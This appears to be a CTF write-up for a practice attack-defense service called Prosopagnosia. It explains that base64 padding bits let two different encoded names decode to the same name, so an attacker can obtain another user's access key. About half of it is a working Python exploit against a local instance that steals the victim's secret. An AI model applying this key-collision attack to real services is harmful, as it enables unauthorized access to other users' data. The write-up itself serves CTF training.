# Prosopagnosia

A little srvice to practize in rewriting of AD-services :)

Backend has 3 routes: create rom, get rom, list roms, first of two accept arguments (rom name especially) as base64 encoded string.
Every rom has an access key generated as:
```
std::string demo_service::get_key(const std::string &name) {
    auto name_decoded = base64_decode(name);

    SHA256 sha;
    sha.update(name_decoded.value);
    sha.update(keys_secret);

    auto digest = sha.digest();
    std::string sha256 = SHA256::toString(digest.get());

    return base64_encode(sha256);
}
```

Which means, that the access key is `base64(sha256(b64decode(name) + secret))`. Solution to the dog's disappearance is base64, which can have more than one encoded strings, that leads to one source string. For example:
```
b64decode('ZGVtby0zYzkxMGMyYi04YzM5LTQxODMtOTExMS03MGYyNDQ0MDk2MWP=') == demo-3c910c2b-8c39-4183-9111-70f24440961c
b64decode('ZGVtby0zYzkxMGMyYi04YzM5LTQxODMtOTExMS03MGYyNDQ0MDk2MWM=') == demo-3c910c2b-8c39-4183-9111-70f24440961c
```

That happens when encoding string has length that not divides by 3, 2 bits of encoded string becomes isinsignificant and can be replaced by any value, which leads to different encoded strings, but same source string.

Prosopagnosia service compares for base64 string of name for collision checking, but when its computing the access key it uses decoded string. So, hacking algorithm is:
```
1) get list of demos names
2) find some base64 that represents that names but not equals to first used base64
3) take key that is equal to the key of the victim
4) GET /api/demo
```

The sploit for getting base64 collisions can be:
```python
import requests
import base64
import string

NAME_HEADER = 'X-Svm-Name'
SECRET_HEADER = 'X-Svm-Secret'
AUTHOR_HEADER = 'X-Svm-Author'
KEY_HEADER = 'X-Svm-Key'

base64_alpha = string.ascii_letters + string.digits

victim_name = 'ZGVtby0zYzkxMGMyYi04YzM5LTQxODMtOTExMS03MGYyNDQ0MDk2MWP='
victim_name_decoded = base64.b64decode(victim_name).decode()

some_content = b'hello-there'

same_base64 = []

for a in base64_alpha:
    p = victim_name[:-2] + a + victim_name[-1]
    if p == victim_name:
        continue
    if base64.b64decode(p).decode() == victim_name_decoded:
        same_base64.append(p)
        print(p)

if len(same_base64) == 0:
    print('no collision')
    exit()

p = same_base64[0]

print(f'will use {p}')

with requests.post('http://localhost:15345/api/demo', 
                   headers={NAME_HEADER: p, SECRET_HEADER: 'TWu=', AUTHOR_HEADER: 'TWu='},
                   files={p: some_content}) as r:
    if r.status_code != 200: raise ValueError(f'{r.status_code} on post')

    key = r.headers.get(KEY_HEADER)

    print(f'The key for {victim_name} is {key}')

with requests.get('http://localhost:15345/api/demo',
                  headers={NAME_HEADER: victim_name, KEY_HEADER: key}) as r:
    if r.status_code != 200: raise ValueError(f'{r.status_code} on get')

    print(r.json()['secret'])
```

